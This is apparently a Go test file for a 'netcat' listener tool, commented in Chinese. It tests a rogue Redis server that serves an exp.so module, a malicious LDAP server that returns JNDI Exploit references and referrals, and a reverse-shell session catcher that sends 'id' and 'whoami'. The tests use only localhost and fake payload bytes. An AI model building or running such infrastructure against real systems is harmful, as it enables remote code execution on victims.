package netcat

import (
	"bufio"
	"bytes"
	"encoding/base64"
	"fmt"
	"io"
	"net"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

func freePort(t *testing.T) int {
	t.Helper()
	ln, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatalf("listen: %v", err)
	}
	port := ln.Addr().(*net.TCPAddr).Port
	ln.Close()
	return port
}

func setup(t *testing.T) {
	t.Helper()
	if err := Init(filepath.Join(t.TempDir(), "netcat.json")); err != nil {
		t.Fatalf("init: %v", err)
	}
}

func TestMatchRule(t *testing.T) {
	buf := []byte("GET /exp.so HTTP/1.0\r\n")
	head := buf
	cases := []struct {
		name string
		rule Rule
		win  []byte
		want bool
	}{
		{"contains", Rule{MatchType: MatchContains, Pattern: "exp.so"}, buf, true},
		{"contains-miss", Rule{MatchType: MatchContains, Pattern: "EXP.so"}, buf, false},
		{"contains-icase", Rule{MatchType: MatchContains, Pattern: "EXP.so", IgnoreCase: true}, buf, true},
		{"prefix", Rule{MatchType: MatchPrefix, Pattern: "GET "}, buf, true},
		{"prefix-miss", Rule{MatchType: MatchPrefix, Pattern: "POST"}, buf, false},
		{"suffix", Rule{MatchType: MatchSuffix, Pattern: "1.0\r\n"}, buf, true},
		{"regex", Rule{MatchType: MatchRegex, Pattern: `ldap://[^ ]+/`}, []byte("x ldap://1.2.3.4:1389/a"), true},
		{"hex", Rule{MatchType: MatchHex, Pattern: `\x00\x01\x02`}, []byte{0, 0, 1, 2, 3}, true},
		{"hex-miss", Rule{MatchType: MatchHex, Pattern: "000102"}, []byte{1, 2, 3}, false},
	}
	for _, c := range cases {
		if got := matchRule(c.rule, c.win, head); got != c.want {
			t.Errorf("%s: got %v want %v", c.name, got, c.want)
		}
	}
}

// 验证 raw 模式下「特征 → payload」真的会写回连接，含跨 TCP 分片的特征
func TestRawRulePayloadAcrossSegments(t *testing.T) {
	setup(t)
	port := freePort(t)
	l, err := CreateListener(Listener{
		Name: "raw", Bind: "127.0.0.1", Port: port, Mode: ModeRaw,
		Rules: []Rule{{
			ID: "r1", Name: "exp", Enabled: true, MatchType: MatchContains, Pattern: "exp.so",
			PayloadType: PayloadText, Payload: "PAYLOAD-OK", CloseAfter: true,
		}},
	})
	if err != nil {
		t.Fatalf("create: %v", err)
	}
	if err := StartListener(l.ID); err != nil {
		t.Fatalf("start: %v", err)
	}
	defer DeleteListener(l.ID)

	conn, err := net.Dial("tcp", fmt.Sprintf("127.0.0.1:%d", port))
	if err != nil {
		t.Fatalf("dial: %v", err)
	}
	defer conn.Close()
	conn.SetDeadline(time.Now().Add(5 * time.Second))
	// 故意拆成两段，验证 4KB 窗口能跨分片匹配
	conn.Write([]byte("GET /ex"))
	time.Sleep(80 * time.Millisecond)
	conn.Write([]byte("p.so HTTP/1.0\r\n\r\n"))
	data, _ := io.ReadAll(conn)
	if !strings.Contains(string(data), "PAYLOAD-OK") {
		t.Fatalf("没有收到 payload，实际收到 %q", data)
	}
	if v := findView(l.ID); v == nil || v.RuleHits < 1 {
		t.Fatalf("规则命中计数未增加")
	}
}

// 验证 SendTimes 限制：同一连接只发一次
func TestRuleSendTimes(t *testing.T) {
	setup(t)
	port := freePort(t)
	l, err := CreateListener(Listener{
		Name: "once", Bind: "127.0.0.1", Port: port, Mode: ModeRaw,
		Rules: []Rule{{
			ID: "r1", Enabled: true, MatchType: MatchContains, Pattern: "tok",
			PayloadType: PayloadText, Payload: "ONE", SendTimes: 1,
		}},
	})
	if err != nil {
		t.Fatalf("create: %v", err)
	}
	StartListener(l.ID)
	defer DeleteListener(l.ID)

	conn, err := net.Dial("tcp", fmt.Sprintf("127.0.0.1:%d", port))
	if err != nil {
		t.Fatalf("dial: %v", err)
	}
	defer conn.Close()
	conn.SetDeadline(time.Now().Add(5 * time.Second))
	conn.Write([]byte("tok"))
	time.Sleep(200 * time.Millisecond)
	conn.Write([]byte(" tok"))
	time.Sleep(200 * time.Millisecond)
	buf := make([]byte, 64)
	n, _ := conn.Read(buf)
	if got := string(buf[:n]); got != "ONE" {
		t.Fatalf("第一次应收到 ONE，实际 %q", got)
	}
	conn.SetReadDeadline(time.Now().Add(300 * time.Millisecond))
	n, _ = conn.Read(buf)
	if n > 0 {
		t.Fatalf("SendTimes=1 时不应再次发送，实际收到 %q", string(buf[:n]))
	}
}

// 验证 redis 内置应答 + bulk 规则推送
func TestRedisMode(t *testing.T) {
	setup(t)
	if _, err := SavePayload("exp.so", []byte("FAKE-MODULE-BYTES")); err != nil {
		t.Fatalf("save payload: %v", err)
	}
	port := freePort(t)
	l, err := CreateListener(Listener{
		Name: "redis", Bind: "127.0.0.1", Port: port, Mode: ModeRedis,
		Rules: []Rule{{
			ID: "r1", Enabled: true, MatchType: MatchContains, Pattern: "exp.so",
			PayloadType: PayloadFile, PayloadFile: "exp.so", Wrap: "bulk", DelayMs: 20,
		}},
	})
	if err != nil {
		t.Fatalf("create: %v", err)
	}
	StartListener(l.ID)
	defer DeleteListener(l.ID)

	conn, err := net.Dial("tcp", fmt.Sprintf("127.0.0.1:%d", port))
	if err != nil {
		t.Fatalf("dial: %v", err)
	}
	defer conn.Close()
	conn.SetDeadline(time.Now().Add(5 * time.Second))

	conn.Write([]byte("*1\r\n$4\r\nPING\r\n"))
	if resp := readLine(t, conn); resp != "+PONG" {
		t.Fatalf("PING 应答应为 +PONG，实际 %q", resp)
	}
	conn.Write([]byte("*3\r\n$6\r\nMODULE\r\n$4\r\nLOAD\r\n$6\r\nexp.so\r\n"))
	rest, _ := io.ReadAll(conn)
	if !bytes.Contains(rest, []byte("$17\r\nFAKE-MODULE-BYTES")) {
		t.Fatalf("未收到 redis bulk payload，实际 %q", rest)
	}
}

func readLine(t *testing.T, conn net.Conn) string {
	t.Helper()
	br := bufio.NewReader(conn)
	line, err := br.ReadString('\n')
	if err != nil {
		t.Fatalf("read: %v", err)
	}
	return strings.TrimRight(line, "\r\n")
}

// 用真实 BER 请求验证 LDAP Bind + Search 应答（JNDI Reference）
func TestLDAPJNDIReference(t *testing.T) {
	setup(t)
	port := freePort(t)
	l, err := CreateListener(Listener{
		Name: "ldap", Bind: "127.0.0.1", Port: port, Mode: ModeLDAP,
		JavaClassName: "Exploit", JavaFactory: "Exploit",
		JavaCodeBase: "http://127.0.0.1:9999/",
	})
	if err != nil {
		t.Fatalf("create: %v", err)
	}
	StartListener(l.ID)
	defer DeleteListener(l.ID)

	conn, err := net.Dial("tcp", fmt.Sprintf("127.0.0.1:%d", port))
	if err != nil {
		t.Fatalf("dial: %v", err)
	}
	defer conn.Close()
	conn.SetDeadline(time.Now().Add(5 * time.Second))

	// BindRequest（匿名、simple）
	bind := tlv(0x30, concat(
		berInt(1),
		tlv(ldapAppBindRequest, concat(berInt(3), berStr(""), tlv(0x80, []byte(""))))),
	)
	conn.Write(bind)
	conn.Write(searchRequest(2, "dc=example,dc=com"))

	// 必须共用一个 bufio.Reader：新建 reader 会把后续字节读进自己的缓冲区而丢失
	br := bufio.NewReader(conn)
	resp, err := readLDAPMessage(br)
	if err != nil {
		t.Fatalf("读 bind 应答: %v", err)
	}
	if !bytes.Contains(resp, []byte{0x61}) {
		t.Fatalf("BindResponse 缺失: %x", resp)
	}
	resp2, err := readLDAPMessage(br)
	if err != nil {
		t.Fatalf("读 search 应答: %v", err)
	}
	for _, want := range []string{"javaClassName", "javaFactory", "javaCodeBase", "http://127.0.0.1:9999/"} {
		if !bytes.Contains(resp2, []byte(want)) {
			t.Fatalf("SearchResultEntry 缺少 %s: %q", want, resp2)
		}
	}
	if v := findView(l.ID); v == nil || v.TotalOut == 0 {
		t.Fatalf("统计数据未累计")
	}
}

// LDAP referral 模式：resultCode 10 + referral URL
func TestLDAPReferral(t *testing.T) {
	setup(t)
	port := freePort(t)
	l, err := CreateListener(Listener{
		Name: "ref", Bind: "127.0.0.1", Port: port, Mode: ModeLDAP,
		LDAPReferral: "ldap://10.0.0.1:1389/Exploit",
	})
	if err != nil {
		t.Fatalf("create: %v", err)
	}
	StartListener(l.ID)
	defer DeleteListener(l.ID)
	conn, _ := net.Dial("tcp", fmt.Sprintf("127.0.0.1:%d", port))
	defer conn.Close()
	conn.SetDeadline(time.Now().Add(5 * time.Second))
	conn.Write(searchRequest(1, "dc=x"))
	resp, err := readLDAPMessage(bufio.NewReader(conn))
	if err != nil {
		t.Fatalf("read: %v", err)
	}
	if !bytes.Contains(resp, []byte("ldap://10.0.0.1:1389/Exploit")) {
		t.Fatalf("referral 缺失: %x", resp)
	}
	// resultCode 10（ENUMERATED 0x0a 0x01 0x0a）
	if !bytes.Contains(resp, []byte{0x0a, 0x01, 0x0a}) {
		t.Fatalf("应返回 resultCode 10: %x", resp)
	}
}

func searchRequest(msgID int, base string) []byte {
	body := concat(
		berStr(base),
		berEnum(2),                       // scope: wholeSubtree
		berEnum(0),                       // derefAliases
		berInt(0),                        // sizeLimit
		berInt(0),                        // timeLimit
		tlv(0x01, []byte{0}),             // typesOnly=false
		tlv(0xa0, berStr("objectClass")), // filter: present
		berSeq(berStr("1.1")),            // attributes
	)
	return tlv(0x30, concat(berInt(msgID), tlv(ldapAppSearchReq, body)))
}

// 验证配置持久化 + AutoStart 重启后自动拉起
func TestPersistenceAndAutoStart(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "netcat.json")
	if err := Init(path); err != nil {
		t.Fatalf("init: %v", err)
	}
	port := freePort(t)
	l, err := CreateListener(Listener{
		Name: "persist", Bind: "127.0.0.1", Port: port, Mode: ModeShell, AutoStart: true,
		AutoCmds: []AutoCmd{{Cmd: "id", DelayMs: 100}},
	})
	if err != nil {
		t.Fatalf("create: %v", err)
	}
	// 重新 Init 相当于服务重启
	if err := Init(path); err != nil {
		t.Fatalf("re-init: %v", err)
	}
	v := findView(l.ID)
	if v == nil || !v.Running {
		t.Fatalf("AutoStart 监听未自动启动: %+v", v)
	}
	defer DeleteListener(l.ID)
	conn, err := net.Dial("tcp", fmt.Sprintf("127.0.0.1:%d", port))
	if err != nil {
		t.Fatalf("dial: %v", err)
	}
	defer conn.Close()
	conn.SetDeadline(time.Now().Add(3 * time.Second))
	buf := make([]byte, 32)
	n, _ := conn.Read(buf)
	if n == 0 || !strings.Contains(string(buf[:n]), "id") {
		t.Fatalf("自动命令未下发: %q", buf[:n])
	}
}

// 验证 shell 会话挂载：历史回放 + 输入转发
func TestSessionAttach(t *testing.T) {
	setup(t)
	port := freePort(t)
	l, err := CreateListener(Listener{Name: "s", Bind: "127.0.0.1", Port: port, Mode: ModeShell})
	if err != nil {
		t.Fatalf("create: %v", err)
	}
	StartListener(l.ID)
	defer DeleteListener(l.ID)

	conn, err := net.Dial("tcp", fmt.Sprintf("127.0.0.1:%d", port))
	if err != nil {
		t.Fatalf("dial: %v", err)
	}
	defer conn.Close()
	conn.Write([]byte("banner-output"))
	time.Sleep(150 * time.Millisecond)

	var sid string
	for _, s := range ListSessions(l.ID) {
		if !s.Closed {
			sid = s.ID
		}
	}
	if sid == "" {
		t.Fatalf("没有活跃会话")
	}
	s := GetSession(sid)
	ch, detach := s.Attach()
	defer detach()
	select {
	case b := <-ch:
		if !strings.Contains(string(b), "banner-output") {
			t.Fatalf("历史回放缺失: %q", b)
		}
	case <-time.After(2 * time.Second):
		t.Fatalf("历史回放超时")
	}
	// 浏览器输入应写回对端
	if err := s.Exec("whoami"); err != nil {
		t.Fatalf("exec: %v", err)
	}
	buf := make([]byte, 32)
	n, _ := conn.Read(buf)
	if !strings.Contains(string(buf[:n]), "whoami") {
		t.Fatalf("输入未转发: %q", buf[:n])
	}
}

func TestPayloadUploadAndDelete(t *testing.T) {
	setup(t)
	data := []byte{0x7f, 0x45, 0x4c, 0x46}
	name, err := SavePayload("../evil.so", data)
	if err != nil {
		t.Fatalf("save: %v", err)
	}
	if name != "evil.so" {
		t.Fatalf("文件名应净化，实际 %q", name)
	}
	files, err := PayloadFiles()
	if err != nil || len(files) == 0 {
		t.Fatalf("列目录失败: %v", err)
	}
	if err := DeletePayload("evil.so"); err != nil {
		t.Fatalf("delete: %v", err)
	}
}

// 编码/解码自检：base64 载荷
func TestResolvePayloadBase64(t *testing.T) {
	setup(t)
	raw, err := resolvePayload(Rule{PayloadType: PayloadBase64, Payload: base64.StdEncoding.EncodeToString([]byte("hi"))})
	if err != nil || string(raw) != "hi" {
		t.Fatalf("base64 载荷解析失败: %q %v", raw, err)
	}
}

func findView(id string) *ListenerView {
	for _, v := range ListViews() {
		if v.ID == id {
			return &v
		}
	}
	return nil
}
